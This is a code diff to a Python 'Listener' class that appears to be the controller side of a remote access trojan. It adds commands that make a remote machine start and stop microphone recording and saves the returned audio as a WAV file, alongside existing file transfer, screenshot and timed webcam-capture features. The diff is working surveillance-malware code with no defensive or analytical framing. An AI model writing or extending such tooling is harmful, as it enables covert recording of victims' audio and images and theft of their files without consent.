@@ -53,6 +53,21 @@ class Listener:
         except Exception as e:
             return f"[-] Error during file/folder download: {str(e)}"
 
+    def download_audio(self, audio_data, path="audio_recording.wav"):
+        try:
+            missing_padding = len(audio_data) % 4
+            if missing_padding:
+                audio_data += "=" * (4 - missing_padding)
+
+            audio_bytes = base64.b64decode(audio_data)
+
+            with open(path, "wb") as audio_file:
+                audio_file.write(audio_bytes)
+
+            return f"[+] Audio file saved as '{path}' successfully!"
+        except Exception as e:
+            return f"[-] Error during audio file download: {str(e)}"
+
     def upload_file(self, path):
         try:
             with open(path, "rb") as file:
@@ -65,7 +80,7 @@ class Listener:
     def save_images(self, images):
         if not os.path.exists("images"):
             os.makedirs("images")
-        for i,  img_data in enumerate(images):
+        for i, img_data in enumerate(images):
             img_bytes = base64.b64decode(img_data)
             with open(f"images/photo_{i+1}.png", "wb") as f:
                 f.write(img_bytes)
@@ -103,6 +118,12 @@ class Listener:
                 n = int(input("Number of images: "))
                 t = int(input("Interval time in seconds[Default: 2s]: "))
                 data = f"capture_image {n} {t}"
+                
+            elif command[0] == "mic_start":
+                data = "mic_start"
+        
+            elif command[0] == "mic_stop":
+                data = "mic_stop"
 
             self.send(data)
             result = self.receive()
@@ -131,7 +152,17 @@ class Listener:
                     print(self.screenshot(result))
                 else:
                     print(result)
-                    
+
+            elif command[0] == "mic_start":
+                print(result)
+
+            elif command[0] == "mic_stop":
+                if result.startswith("[-]"):
+                    print(result)
+                else:
+                    download_result = self.download_audio(result)
+                    print(download_result)
+
             else:
                 print(result)
 
